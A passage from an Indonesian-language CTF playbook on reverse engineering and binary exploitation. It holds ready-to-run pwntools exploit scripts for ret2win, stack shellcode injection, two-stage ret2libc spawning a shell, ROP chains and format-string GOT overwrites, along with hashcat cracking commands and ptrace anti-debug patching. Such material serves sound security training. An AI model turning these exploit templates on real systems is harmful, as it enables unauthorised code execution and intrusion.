nm -D $BINARY 2>/dev/null | grep -i "md5\|sha"
```

**OUTPUT BERHASIL ✅:**

text

```
MD5_Init
MD5_Update
MD5_Final
```

Bash

```
# Cari expected hash di Ghidra (cari array 16/20/32 byte di .rodata)
# Lalu extract dan crack

# Crack dengan hashcat
# MD5 (16 bytes = 32 hex chars):
echo "5f4dcc3b5aa765d61d8327deb882cf99" | hashcat -m 0 - /usr/share/wordlists/rockyou.txt --show

# SHA1 (20 bytes = 40 hex chars):
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt

# SHA256 (32 bytes = 64 hex chars):
hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt

# Online (instant):
# https://crackstation.net/
# https://md5hashing.net/
```

**OUTPUT BERHASIL ✅ — Hash cracked:**

text

```
5f4dcc3b5aa765d61d8327deb882cf99:password
```

Bash

```
echo "password" | $BINARY
```

**OUTPUT GAGAL ❌ — Tidak ada di wordlist:**

text

```
Exhausted
```

Bash

```
# Coba dengan rules
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Brute force pendek (jika tahu panjang)
hashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a    # 6 karakter
```

---

### Pattern RE-7: Anti-Debug via ptrace

**Trigger:**

- Program berjalan normal tapi langsung exit di GDB
- `strace` menampilkan `ptrace(PTRACE_TRACEME)`
- `ltrace` menampilkan pesan "debugger detected"

Bash

```
# Konfirmasi
strace $BINARY 2>&1 | grep ptrace
# Atau cek di imports:
nm -D $BINARY | grep ptrace
objdump -d $BINARY | grep "ptrace"
```

**Bypass Method 1 — GDB Catchpoint (Paling Cepat):**

Bash

```
gdb -q $BINARY
(gdb) catch syscall ptrace       # Intercept semua ptrace calls
(gdb) run <<< "test_input"
# Program berhenti di ptrace call

(gdb) finish                     # Tunggu ptrace return (hasilnya -1)
# "Value returned is $1 = -1"

(gdb) set $rax = 0              # Paksa return 0 (= tidak ada debugger)
(gdb) continue                   # Program pikir tidak ada debugger
```

**OUTPUT BERHASIL ✅:**

text

```
Debugger check passed.
FLAG: FLAG{ptr4c3_bypass3d}
```

**Bypass Method 2 — NOP ptrace call (Permanent Patch):**

Bash

```
# Di Ghidra: temukan CALL ptrace, catat file offset
# Patch dengan Python
python3 << 'EOF'
data = bytearray(open("./challenge", "rb").read())
# Ganti CALL ptrace (E8 xx xx xx xx) dengan NOPs
# Offset dari Ghidra file offset view
offset = 0x1140    # Sesuaikan dengan binary
for i in range(5):
    data[offset + i] = 0x90    # NOP
open("./challenge_patched", "wb").write(data)
print("Patched!")
EOF
chmod +x ./challenge_patched
./challenge_patched <<< "test"
```

---

### Pattern RE-8: UPX Packed Binary

Sudah ditangani di **Langkah 0.5**. Setelah unpack, kembali ke triage.

---

### Pattern RE-9: Stripped Binary

**Trigger:**

- `file` output: `stripped`
- `nm` tidak ada output berguna

Bash

```
# Temukan main() manual
gdb -q $BINARY
(gdb) info functions              # Jika ada simbol dinamis
(gdb) disassemble _start          # Lihat argumen ke __libc_start_main
```

**Di Ghidra:**

text

```
Symbol Tree → Functions → entry (_start)
Decompiler akan tampilkan:
__libc_start_main(FUN_00101149, ...)
                  ↑
            Ini adalah main()!
```

text

```
1. Double-click FUN_00101149
2. Tekan L → rename jadi "main"
3. Analisis normal dari sini
```

---

### Pattern PWN-1: ret2win

**Trigger:**

- Ada fungsi `win()` / `get_flag()` / `shell()` di `nm` output
- Fungsi tersebut tidak pernah dipanggil dalam normal flow
- Ada buffer overflow (gets/read/strcpy)

Bash

```
# Konfirmasi win function ada
nm $BINARY 2>/dev/null | grep -Ei "win|get_flag|shell|print_flag"
objdump -d $BINARY | grep -Ei "<win>|<get_flag>|<shell>"

# Dapatkan alamat win
export WIN_ADDR=$(nm $BINARY 2>/dev/null | grep " win$" | awk '{print "0x"$1}')
echo "WIN address: $WIN_ADDR"
```

**OUTPUT BERHASIL ✅:**

text

```
0000000000401196 T win
WIN address: 0x401196
```

**Step 1: Cari offset (berapa padding sebelum overwrite RIP)**

Bash

```
# Generate cyclic pattern
python3 -c "from pwn import *; print(cyclic(200).decode())" > /tmp/pattern.txt

# Jalankan dengan pattern
gdb -q $BINARY << 'EOF'
run < /tmp/pattern.txt
EOF
```

**OUTPUT BERHASIL ✅ — Program crash, lihat RSP:**

text

```
Program received signal SIGSEGV
RSP = 0x6161616a ("jaaa")
```

Python

```
# Cari offset dari crash value
python3 -c "from pwn import *; print(cyclic_find(0x6161616a))"
# atau
python3 -c "from pwn import *; print(cyclic_find(b'jaaa'))"
```

**OUTPUT BERHASIL ✅:**

text

```
40
```

➡️ Offset adalah 40. Setelah 40 byte, kita overwrite RIP.

**Step 2: Buat dan jalankan exploit**

Python

```
#!/usr/bin/env python3
# ~/binary_ctf/solvers/ret2win_exploit.py

from pwn import *

BINARY = "./challenge"
elf = ELF(BINARY, checksec=False)
context.binary = elf

io = process(BINARY)

# WIN address (dari nm atau Ghidra)
if "win" in elf.symbols:
    WIN = elf.symbols["win"]
else:
    WIN = 0x401196    # Isi manual jika stripped

OFFSET = 40           # Dari cyclic_find

# Cek apakah butuh stack alignment (x86-64 ABI)
# Jika crash di movaps → tambah RET gadget
rop = ROP(elf)
RET = rop.find_gadget(["ret"]).address

# Payload basic
payload = flat(
    b"A" * OFFSET,
    p64(WIN)
)

io.sendlineafter(b":", payload)    # Sesuaikan prompt-nya
io.interactive()
```

Bash

```
python3 ~/binary_ctf/solvers/ret2win_exploit.py
```

**OUTPUT BERHASIL ✅:**

text

```
[+] Starting local process './challenge': pid 1234
FLAG{r3t2w1n_succ3ss}
```

**OUTPUT GAGAL ❌ — SIGSEGV setelah payload:**

text

```
Program received signal SIGSEGV
```

Cek satu per satu:

Python

```
# 1. Test offset dulu
payload = flat(b"A" * OFFSET, p64(0xdeadbeef))
# Jika crash di 0xdeadbeef → offset benar

# 2. Jika offset benar tapi masih crash → stack alignment
# Tambah RET gadget sebelum WIN
payload = flat(b"A" * OFFSET, p64(RET), p64(WIN))

# 3. Jika masih crash → cek apakah WIN function butuh argumen
# Di Ghidra: lihat apa yang WIN lakukan, apakah ada kondisi cek
```

**OUTPUT GAGAL ❌ — `sendlineafter` timeout:**

text

```
[!] Timeout reading until b":"
```

Python

```
# Ganti dengan sendline langsung
io.sendline(payload)
# Atau lihat prompt yang benar:
io.recvuntil(b"Enter")    # Sesuaikan
io.sendline(payload)
```

---

### Pattern PWN-2: Classic Stack Buffer Overflow

**Trigger:**

- Ada `gets()`, `strcpy()`, `scanf("%s")`, `read()` dengan size terlalu besar
- Canary OFF
- Tidak ada fungsi win()

Bash

```
# Konfirmasi input sink
objdump -d $BINARY | grep -A2 "gets\|strcpy\|scanf" | head -20

# Test crash
python3 -c "print('A'*200)" | $BINARY 2>&1
```

**OUTPUT BERHASIL ✅ — Program crash:**

text

```
Segmentation fault (core dumped)
```

➡️ Overflow confirmed. Tentukan next step berdasarkan checksec:

text

```
NX OFF + No win() → PWN-3 (Shellcode)
NX ON + No win()  → PWN-4/5 (ret2libc/ROP)
NX OFF + win()    → PWN-1 (ret2win, lebih mudah)
```

---

### Pattern PWN-3: Shellcode Injection

**Trigger:**

- NX: **disabled** (dari checksec)
- Stack executable
- Ada buffer overflow
- Kontrol RIP

Bash

```
# Verifikasi NX off
checksec $BINARY | grep "NX"
# Harus: NX disabled
```

Python

```
#!/usr/bin/env python3
# ~/binary_ctf/solvers/shellcode_exploit.py

from pwn import *

BINARY = "./challenge"
elf = ELF(BINARY, checksec=False)
context.binary = elf
context.log_level = "info"

io = process(BINARY)

# Shellcode untuk spawn /bin/sh
shellcode = asm(shellcraft.sh())

OFFSET = 40       # Dari cyclic_find

# Perlu tahu alamat buffer di stack
# Cara 1: GDB breakpoint sebelum fungsi read, lihat RSP
# Cara 2: Program leak alamat buffer (kadang soal sengaja print address)
BUFFER_ADDR = 0x7fffffffe1a0    # Dari GDB: x/s $rsp setelah gets()

payload = flat(
    shellcode,
    b"A" * (OFFSET - len(shellcode)),
    p64(BUFFER_ADDR)
)

io.sendline(payload)
io.interactive()
```

> **CATATAN:** ASLR menyebabkan `BUFFER_ADDR` berubah tiap run. Soal CTF yang menggunakan shellcode biasanya menonaktifkan ASLR atau menyediakan leak alamat.

Bash

```
# Cek apakah ASLR aktif di sistem
cat /proc/sys/kernel/randomize_va_space
# 0 = ASLR off, 2 = ASLR on

# Nonaktifkan ASLR untuk testing lokal
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

---

### Pattern PWN-4: ret2libc (NX ON, ASLR aktif)

**Trigger:**

- NX: enabled
- Tidak bisa jalankan shellcode di stack
- Butuh `system("/bin/sh")` dari libc
- Perlu libc leak dulu karena ASLR

Bash

```
# Cek apakah libc tersedia
ls -la libc.so.6 2>/dev/null || echo "Libc tidak disertakan"

# Kalau tidak ada, identifikasi versi di remote
# Cek import dari binary:
nm -D $BINARY | grep puts    # Kita akan leak puts untuk hitung libc base
```

**Workflow ret2libc 2 stage:**

text

```
STAGE 1: Leak alamat libc via puts(puts@GOT) → kembali ke main
STAGE 2: Hitung libc base, panggil system("/bin/sh")
```

Python

```
#!/usr/bin/env python3
# ~/binary_ctf/solvers/ret2libc_exploit.py

from pwn import *

BINARY = "./challenge"
LIBC   = "./libc.so.6"      # Sesuaikan jika berbeda

elf  = ELF(BINARY, checksec=False)
libc = ELF(LIBC,   checksec=False)
context.binary = elf

io = process(BINARY)

rop = ROP(elf)
OFFSET  = 40
POP_RDI = rop.find_gadget(["pop rdi", "ret"]).address
RET     = rop.find_gadget(["ret"]).address

# ============================================================
# STAGE 1: Leak libc address via puts(puts@GOT)
# ============================================================
PUTS_PLT = elf.plt["puts"]
PUTS_GOT = elf.got["puts"]
MAIN     = elf.symbols["main"]

payload1 = flat(
    b"A" * OFFSET,
    RET,              # Stack alignment
    POP_RDI,
    PUTS_GOT,
    PUTS_PLT,         # Panggil puts(puts@GOT) → leak alamat puts di libc
    MAIN              # Return ke main untuk stage 2
)

io.sendlineafter(b":", payload1)

# Baca leak
leaked = io.recvline().strip()[:8]
leaked_puts = u64(leaked.ljust(8, b"\x00"))
log.success(f"Leaked puts @ {hex(leaked_puts)}")

# ============================================================
# STAGE 2: Hitung base, panggil system("/bin/sh")
# ============================================================
libc.address = leaked_puts - libc.symbols["puts"]
log.success(f"libc base @ {hex(libc.address)}")

SYSTEM = libc.symbols["system"]
BIN_SH = next(libc.search(b"/bin/sh\x00"))

payload2 = flat(
    b"A" * OFFSET,
    RET,              # Stack alignment
    POP_RDI,
    BIN_SH,
    SYSTEM
)

io.sendlineafter(b":", payload2)
io.interactive()
```

Bash

```
python3 ~/binary_ctf/solvers/ret2libc_exploit.py
```

**OUTPUT BERHASIL ✅:**

text

```
[+] Leaked puts @ 0x7ffff7dd18b0
[+] libc base @ 0x7ffff7a8b000
[*] Switching to interactive mode
$ whoami
ctf_user
$ cat flag.txt
FLAG{r3t2l1bc_m4st3r}
```

**OUTPUT GAGAL ❌ — Leak tidak terbaca dengan benar:**

text

```
[*] Leaked: b'\n'  ← kosong
```

Python

```
# Kemungkinan: leak ada di output sebelumnya, ubah timing receive
io.recvuntil(b"some prompt")    # Flush output sebelumnya
leaked = io.recv(8)             # Langsung recv 8 byte
leaked_puts = u64(leaked.ljust(8, b"\x00"))
```

**OUTPUT GAGAL ❌ — `movaps` crash setelah libc:**

text

```
SIGSEGV at movaps xmmword ptr [rsp], xmm0
```

➡️ Stack alignment issue:

Python

```
# Tambah extra RET gadget sebelum SYSTEM
payload2 = flat(
    b"A" * OFFSET,
    RET,          # Alignment byte 1
    RET,          # Alignment byte 2 (coba dengan 1 atau 2)
    POP_RDI,
    BIN_SH,
    SYSTEM
)
```

**Jika libc tidak disertakan, identifikasi via LibcSearcher:**

Python

```
from LibcSearcher import LibcSearcher

# Setelah dapat leak:
obj = LibcSearcher("puts", leaked_puts)
libc_base = leaked_puts - obj.dump("puts")
system_addr = libc_base + obj.dump("system")
bin_sh_addr = libc_base + obj.dump("str_bin_sh")
```

---

### Pattern PWN-5: ROP Chain

**Trigger:**

- NX: enabled
- Kontrol RIP
- Tidak ada libc leak point yang jelas
- Binary menyediakan gadget sendiri

Bash

```
# Cari gadget
ROPgadget --binary $BINARY | grep "pop rdi"
ROPgadget --binary $BINARY | grep "pop rsi"
ROPgadget --binary $BINARY | grep "syscall"
ROPgadget --binary $BINARY | grep -E " : ret$"

# Simpan semua gadget
ROPgadget --binary $BINARY > ~/binary_ctf/loot/gadgets.txt
wc -l ~/binary_ctf/loot/gadgets.txt
```

Python

```
#!/usr/bin/env python3
# ~/binary_ctf/solvers/rop_exploit.py

from pwn import *

BINARY = "./challenge"
elf = ELF(BINARY, checksec=False)
context.binary = elf

io = process(BINARY)
rop = ROP(elf)

OFFSET  = 40
POP_RDI = rop.find_gadget(["pop rdi", "ret"]).address
POP_RSI = rop.find_gadget(["pop rsi", "ret"]).address
POP_RDX = rop.find_gadget(["pop rdx", "ret"]).address
RET     = rop.find_gadget(["ret"]).address

# Jika ada /bin/sh di binary
BIN_SH = next(elf.search(b"/bin/sh\x00"), None)

if BIN_SH and "system" in elf.plt:
    # Path mudah: binary punya system + /bin/sh
    payload = flat(
        b"A" * OFFSET,
        RET,
        POP_RDI, BIN_SH,
        elf.plt["system"]
    )
else:
    # Path syscall: execve("/bin/sh", NULL, NULL)
    # Butuh: rax=59, rdi=/bin/sh, rsi=0, rdx=0, syscall
    BIN_SH_ADDR = elf.bss() + 0x100    # Tulis /bin/sh ke BSS dulu
    
    log.info("Using syscall path")
    # ... (lihat template di Fase 4 Bagian 4.5)

io.sendline(payload)
io.interactive()
```

---

### Pattern PWN-6: Format String Bug (Read)

**Trigger:**

- `printf(user_input)` tanpa format specifier
- `echo "%p.%p.%p" | $BINARY` menghasilkan output dengan address

Bash

```
# Konfirmasi FSB
echo "%p.%p.%p.%p.%p.%p.%p.%p" | $BINARY 2>&1

# Cari offset stack yang benar
for i in $(seq 1 50); do
    result=$(echo "%${i}\$p" | $BINARY 2>&1)
    echo "Offset $i: $result"
done
```

**OUTPUT BERHASIL ✅ — Ada address leak:**

text

```
0x7ffff7dd1b58.0x7ffff7a8b000.0xnil.(nil).0x401196.0x7ffff7a3d0b0
```

**Identifikasi jenis address:**

- `0x7ffff7...` → libc address
- `0x5555...` → PIE binary address
- `0x7fff...` → stack address
- `0x401...` → binary address (no PIE)

Python

```
#!/usr/bin/env python3
# ~/binary_ctf/solvers/fsb_read.py

from pwn import *

BINARY = "./challenge"
elf = ELF(BINARY, checksec=False)
context.binary = elf

io = process(BINARY)

# Test berbagai offset untuk cari leak yang berguna
payload = b"%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p"
io.sendline(payload)
output = io.recvline()
print(f"Leaked: {output}")

# Parse nilai yang bocor
values = output.strip().split(b".")
for i, v in enumerate(values):
    try:
        addr = int(v, 16)
        region = "libc" if 0x7f0000000000 < addr < 0x7fffffffffff else \
                 "PIE" if 0x555555554000 < addr < 0x555555600000 else \
                 "stack" if 0x7ffe00000000 < addr else "unknown"
        print(f"  Position {i+1}: {hex(addr)} ({region})")
    except:
        pass
```

**Setelah dapat leak, hitung base:**

Python

```
# Contoh: leaked_libc = nilai dari offset ke-X
LIBC_SYMBOL_OFFSET = 0x1d1b58    # Offset dari libc (lihat dengan: nm -D libc.so.6 | grep symbol_name)
libc_base = leaked_libc - LIBC_SYMBOL_OFFSET
log.success(f"libc base: {hex(libc_base)}")
```

---

### Pattern PWN-7: Format String Bug (Write)

**Trigger:**

- FSB confirmed (dari PWN-6)
- Ada target yang bisa dioverwrite (GOT entry, fungsi pointer, global var)
- RELRO: No/Partial (Full RELRO = GOT overwrite tidak bisa)

Python

```
#!/usr/bin/env python3
# ~/binary_ctf/solvers/fsb_write.py

from pwn import *

BINARY = "./challenge"
elf = ELF(BINARY, checksec=False)
context.binary = elf

io = process(BINARY)

# Target: overwrite GOT entry puts → win()
TARGET_ADDR = elf.got["puts"]        # Alamat GOT puts
TARGET_VALUE = elf.symbols["win"]    # Nilai yang ingin ditulis

# Stack offset dari format string (cari dengan brute-force di atas)
STACK_OFFSET = 6    # Sesuaikan!

payload = fmtstr_payload(STACK_OFFSET, {TARGET_ADDR: TARGET_VALUE})
io.sendline(payload)
io.interactive()
```

**OUTPUT GAGAL ❌ — fmtstr_payload gagal:**

text

```
ValueError: cannot find offset
```

Bash

```
# Cari offset manual dulu
python3 << 'EOF'
from pwn import *
BINARY = "./challenge"
elf = ELF(BINARY, checksec=False)

for offset in range(1, 50):
    io = process(BINARY)
    # Buat format string dengan marker unik
    marker = 0xdeadbeef
    payload = f"%{offset}$p".encode()
    io.sendline(payload)
    out = io.recvline()
    if b"0xdeadbeef" in out:
        print(f"Marker at offset: {offset}")
        break
    io.close()
EOF
```

---

### Pattern PWN-8: PIE + ASLR Bypass via Leak

**Trigger:**

- PIE: enabled (dari checksec)
- Binary base address berubah tiap run
- Ada information leak (FSB, print address, etc.)

Python

```
# Setelah dapat leaked_addr (misal dari %p output):
leaked_addr = 0x5555555552a0    # Contoh

# Dari Ghidra: fungsi main ada di offset 0x12a0 dari binary base
MAIN_OFFSET = 0x12a0            # Offset yang konsisten dari Ghidra

# Hitung PIE base
PIE_BASE = leaked_addr - MAIN_OFFSET
log.success(f"PIE base: {hex(PIE_BASE)}")

# Sekarang hitung alamat apapun:
WIN_GHIDRA = 0x101196           # Alamat di Ghidra (basis 0x100000)
WIN_RUNTIME = PIE_BASE + (WIN_GHIDRA - 0x100000)
log.success(f"WIN at runtime: {hex(WIN_RUNTIME)}")
```

---

## ═══════════════════════════════════════

## FASE 2: DYNAMIC ANALYSIS — GDB + PWNDBG

## ═══════════════════════════════════════

### Langkah 2.1 — Setup GDB dan Breakpoint

Bash

```
# Install pwndbg jika belum
git clone https://github.com/pwndbg/pwndbg ~/tools/pwndbg
cd ~/tools/pwndbg && ./setup.sh

# Buka binary
gdb -q $BINARY

# Setup dasar
(gdb) set pagination off
(gdb) set disassembly-flavor intel
```

**Breakpoint strategies:**

Bash

```
# Not stripped:
(gdb) break main
(gdb) break win
(gdb) break *0x401196      # Alamat langsung

# Stripped dengan PIE:
(gdb) starti               # Stop di instruksi pertama
(gdb) vmmap                # Lihat base address
# Output: 0x555555554000 ... ./challenge
# Base = 0x555555554000

# Kalkulasi alamat runtime:
python3 -c "base=0x555555554000; ghidra=0x101196; print(hex(base + (ghidra - 0x100000)))"
# Result: 0x555555555196

(gdb) break *0x555555555196

# Atau gunakan pwndbg piebreak:
(gdb) piebreak *0x101196
```

### Langkah 2.2 — Inspeksi Register dan Memory

Bash

```
# Setelah hit breakpoint:

# Lihat semua register
(gdb) info registers
# atau di pwndbg:
(gdb) regs

# Lihat string di register
(gdb) x/s $rdi          # Argumen 1 (sering = input atau target string)
(gdb) x/s $rsi          # Argumen 2

# Dump stack
(gdb) x/20gx $rsp       # 20 qword dari stack
(gdb) telescope $rsp    # pwndbg - lebih readable

# Lihat instruksi berikutnya
(gdb) x/10i $rip

# Cari string di memory
(gdb) find $rsp, +0x1000, "CTF{"

# Dump memory ke file
(gdb) dump binary memory /tmp/memdump.bin 0x555555554000 0x555555560000
```

**OUTPUT BERHASIL ✅ — Break di strcmp, baca argumen:**

Bash

```
(gdb) break strcmp
(gdb) run <<< "wrong_input"
# Hit:
(gdb) x/s $rdi          # Argumen 1 = input kita
# 0x7fffffffe1a0: "wrong_input"
(gdb) x/s $rsi          # Argumen 2 = target
# 0x555555556020: "CTF{r3al_p4ssw0rd}"
```

➡️ **FLAG KETEMU!** `CTF{r3al_p4ssw0rd}`

### Langkah 2.3 — Cari Offset dengan Cyclic Pattern

Bash

```
# Step 1: Generate pattern
python3 -c "from pwn import *; print(cyclic(200))" > /tmp/pattern.txt

# Step 2: Jalankan di GDB
gdb -q $BINARY
(gdb) run < /tmp/pattern.txt

# Step 3: Lihat nilai RSP/RIP saat crash
(gdb) info registers rsp rip
# RSP = 0x6161616a (nilai dari pattern)

# Step 4: Hitung offset
python3 -c "from pwn import *; print(cyclic_find(0x6161616a))"
# atau
python3 -c "from pwn import *; print(cyclic_find(b'jaaa'))"
```

**OUTPUT BERHASIL ✅:**

text

```
40
```

**OUTPUT GAGAL ❌ — cyclic_find returns None:**

text

```
None
```

Python

```
# Kemungkinan value terpotong (64-bit RSP)
# Ambil 4 byte pertama dari RSP value
# Jika RSP = 0x00007fff6161616a, ambil 0x6161616a

# Atau gunakan metode manual:
# Isi dengan berbagai panjang sampai tepat crash di RIP
for offset in [20, 24, 32, 40, 48, 56, 64]:
    python3 -c f"print('A'*{offset} + 'BBBBBBBB')" | $BINARY
# Jika B8 muncul di RIP → offset ditemukan
```

---

## ═══════════════════════════════════════

## FASE 3: STATIC ANALYSIS — GHIDRA

## ═══════════════════════════════════════

Untuk detail lengkap Ghidra workflow, lihat **[🧭 BAGIAN 0: FONDASI REVERSE ENGINEERING](/docs/reverse-engineering)**. Berikut ringkasan untuk keputusan cepat:

### Langkah 3.1 — Import dan Analisis

Bash

```
ghidra &
# File → Import File → pilih binary
# Double-click di project → Yes → Analyze → OK
# Tunggu progress bar selesai
```

### Langkah 3.2 — Cari Main dan Fungsi Kritis

text

```
Symbol Tree → Functions → cari:
- main (jika not stripped)
- win / get_flag / shell
- check / validate / auth

Jika stripped:
- entry → __libc_start_main(FUN_XXXXXX, ...) → FUN_XXXXXX adalah main
```

### Langkah 3.3 — Identifikasi Pattern di Decompiler

**Pattern RE (XOR):**

C

```
// Terlihat di decompiler:
while (i < 16) {
    if ((user_input[i] ^ 0x4f) != CIPHER[i]) { return FAIL; }
    i++;
}
```

➡️ **RE-2 Pattern** → Buat XOR solver

**Pattern PWN (Buffer Overflow):**

C

```
char buffer[64];
gets(buffer);      // ← Vulnerable! Tidak ada size limit
```

➡️ **PWN-2 Pattern** → Cyclic pattern, cari offset

**Pattern FSB:**

C

```
printf(user_input);    // ← Input langsung ke printf tanpa format string!
```

➡️ **PWN-6/7 Pattern** → `%p` untuk leak, `fmtstr_payload` untuk write

---

## ═══════════════════════════════════════

## FASE 4: PWNTOOLS BOILERPLATE TEMPLATES

## ═══════════════════════════════════════

### Template Universal (Copy-paste untuk semua PWN)

Python

```
#!/usr/bin/env python3
# ~/binary_ctf/solvers/exploit_template.py

from pwn import *
import os

# ============================================================
# CONFIGURATION — ISI INI DULU
# ============================================================
BINARY = "./challenge"
LIBC   = "./libc.so.6"        # Jika ada
HOST   = "challenge.ctf.com"
PORT   = 1337

# ============================================================
# SETUP
# ============================================================
elf  = ELF(BINARY, checksec=False)
libc = ELF(LIBC, checksec=False) if os.path.exists(LIBC) else None
context.binary = elf
context.log_level = "info"    # Ganti ke "debug" jika butuh verbose

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug(BINARY, """
            break main
            continue
        """)
    return process(BINARY)

io = start()

# ============================================================
# EXPLOIT CODE — ISI DI SINI
# ============================================================

# Example ret2win:
OFFSET = 40                           # Dari cyclic_find
WIN    = elf.symbols.get("win", 0)    # Atau isi manual

payload = flat(b"A" * OFFSET, p64(WIN))
io.sendlineafter(b":", payload)

# ============================================================
# INTERACT
# ============================================================
io.interactive()
```

**Jalankan:**

Bash

```
python3 exploit.py          # Local
python3 exploit.py GDB      # Dengan GDB debugger
python3 exploit.py REMOTE   # Remote challenge
python3 exploit.py DEBUG    # Verbose logging
```

### One-Liner Cyclic Offset Finder

Python

```
#!/usr/bin/env python3
# Jalankan ini, lalu copy crash value dari GDB

from pwn import *

# Step 1: Print cyclic pattern
pattern = cyclic(300)
print(pattern.decode())
# Copy output, paste sebagai input ke program di GDB

# Step 2: Setelah crash, copy nilai RSP dari GDB ke sini:
crash_value = 0x6161616a    # Dari: info registers rsp
print(f"\nOffset: {cyclic_find(crash_value)}")
```

---

## ═══════════════════════════════════════

## DECISION MATRIX — QUICK REFERENCE

## ═══════════════════════════════════════

### Dari Checksec ke Technique

|Checksec Output|Temuan|Pattern|Workflow|
|---|---|---|---|
|No Canary, NX OFF|gets() + win()|PWN-1|ret2win|
|No Canary, NX OFF|gets(), no win()|PWN-3|Shellcode|
|No Canary, NX ON|gets() + win()|PWN-1|ret2win|
|No Canary, NX ON|gets(), no win()|PWN-4/5|ret2libc/ROP|
|Canary ON, NX ON|printf(input)|PWN-6/7|FSB|
|PIE ON|Code pointer leak|PWN-8|PIE bypass via leak|
|Full RELRO|Any BOF|PWN-4/5|ROP (bukan GOT overwrite)|
|Stripped|-|RE-9|Ghidra: cari main via _start|

### Dari ltrace/strings ke Pattern

|Signal|Pattern|Immediate Action|
|---|---|---|
|`strcmp(input, "target")`|RE-1|Submit "target" langsung|
|`memcmp(addr1, addr2, n)`|RE-1|GDB dump addr2|
|Loop dengan `^ constant` di Ghidra|RE-2|XOR solver Python|
|Loop dengan `^ key[i%len]` di Ghidra|RE-3|Repeating XOR solver|
|`ptrace(PTRACE_TRACEME)`|RE-7|GDB catch syscall ptrace|
|UPX strings|RE-8|`upx -d` binary dulu|
|`gets()`/`strcpy()` + no canary|PWN-2|Cyclic → offset|
|`printf(user_input)` + `%p` works|PWN-6|FSB leak|
|`win()` function exists|PWN-1|ret2win|
|`malloc()` + `free()` + use-after|PWN-9|Heap analysis|

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|No|Error / Gejala|Penyebab|Solusi|
|---|---|---|---|
|1|`SIGSEGV` setelah payload|Offset salah / address salah|Verifikasi offset, cek address satu per satu|
|2|`EOFError: EOF occurred`|Process exit sebelum receive|Cek timing `sendlineafter` vs `sendline`|
|3|Exploit jalan di GDB tapi gagal normal|ASLR/PIE aktif di luar GDB|Disable ASLR untuk test: `echo 0 > /proc/sys/kernel/randomize_va_space`|
|4|`movaps` SIGSEGV|Stack misalignment 16-byte|Tambah `RET` gadget sebelum SYSTEM|
|5|`cyclic_find()` returns None|Value terpotong / endian salah|Ambil 4 byte dari crash value: `cyclic_find(crash & 0xffffffff)`|
|6|Libc symbols tidak ditemukan|Versi libc berbeda|Identifikasi remote libc via LibcSearcher / libc.rip|
|7|`ROP()` tidak menemukan gadget|Gadget tidak ada di binary|Cari di libc: `ROPgadget --binary libc.so.6 \| grep "pop rdi"`|
|8|`fmtstr_payload` error|Stack offset salah|Brute-force offset: `echo "%1$p"|
|9|PIE address berubah|PIE + ASLR aktif|Dapatkan leak dulu, kalkulasi base|
|10|Binary tidak bisa dianalisis di Ghidra|Format tidak dikenali|Import sebagai Raw Binary, set arch manual|
|11|`ltrace` kosong|Binary statically linked|Langsung ke Ghidra/GDB|
|12|GDB crash binary saat attach|Anti-debug ptrace aktif|`catch syscall ptrace → finish → set $rax=0`|
|13|`one_gadget` tidak bekerja|Constraint tidak terpenuhi|Coba gadget lain, penuhi constraint register|
|14|Remote berbeda dari local|Libc/environment berbeda|Dapatkan remote libc: `one_gadget libc_remote.so.6`|
|15|Payload dipotong|Null byte / newline restriction|Cek karakter berbahaya di payload, gunakan encoder|

**Google Search Templates:**

text

```
# Jika buntu total:
"ctf binary <challenge_name> writeup"
"pwntools EOFError sendlineafter"
"ghidra stripped binary find main"
"ret2libc stack alignment movaps"
"format string offset brute force"
"<error_message> ctf pwn exploit"
```

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
BINARY CHALLENGE DITERIMA
│
├─ FASE 0: TRIAGE 5 MENIT
│   ├─ file + checksec → Catat: arch, PIE, NX, Canary, Stripped
│   ├─ strings → [Flag ketemu?] → SELESAI
│   ├─ ltrace → [strcmp bocor?] → Submit password → SELESAI
│   ├─ UPX detected? → unpack dulu, ulangi triage
│   └─ Tentukan: RE atau PWN?
│
├─ RE PATTERNS
│   ├─ [strcmp/memcmp via ltrace]  → RE-1 → Submit target string
│   ├─ [XOR loop di Ghidra]        → RE-2/3 → Python XOR solver
│   ├─ [Hash verification]         → RE-4 → Hashcat/CrackStation
│   ├─ [ptrace anti-debug]         → RE-7 → GDB catch syscall ptrace bypass
│   ├─ [UPX packed]                → RE-8 → upx -d → triage ulang
│   ├─ [Stripped binary]           → RE-9 → Ghidra cari main via _start
│   └─ [Multi-stage decrypt]       → RE-10 → Map setiap stage, solve berurutan
│
├─ PWN PATTERNS
│   ├─ [win() function exists]     → PWN-1 → Cyclic offset → ret2win
│   ├─ [gets() + NX OFF]           → PWN-3 → Shellcode injection
│   ├─ [gets() + NX ON]            → PWN-4/5 → ret2libc atau ROP chain
│   ├─ [printf(user_input)]        → PWN-6 → FSB leak → PWN-7 → FSB write
│   ├─ [PIE ON + leak point]       → PWN-8 → Leak → kalkulasi base → exploit
│   ├─ [malloc/free use-after]     → PWN-9 → Heap analysis
│   └─ [libc known + gadget]       → PWN-10 → one_gadget
│
└─ SETELAH DAPAT SHELL
    ├─ Local: cat flag.txt / cat /flag
    └─ Remote: flag biasanya di ~/ atau /
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === TRIAGE ===
file ./challenge && checksec ./challenge
strings -n 6 ./challenge | grep -Ei "flag|win|pass|ctf\{|upx"
ltrace ./challenge <<< "AAAA" 2>&1 | grep -E "strcmp|memcmp|ptrace"
echo "%p.%p.%p.%p" | ./challenge    # Test FSB

# === FIND OFFSET ===
python3 -c "from pwn import *; print(cyclic(300).decode())"
python3 -c "from pwn import *; print(cyclic_find(0x6161616a))"

# === GADGETS ===
ROPgadget --binary ./challenge | grep "pop rdi"
ROPgadget --binary ./challenge | grep -E " : ret$"
one_gadget ./libc.so.6

# === PWNTOOLS QUICK ===
python3 -c "
from pwn import *
elf = ELF('./challenge', checksec=False)
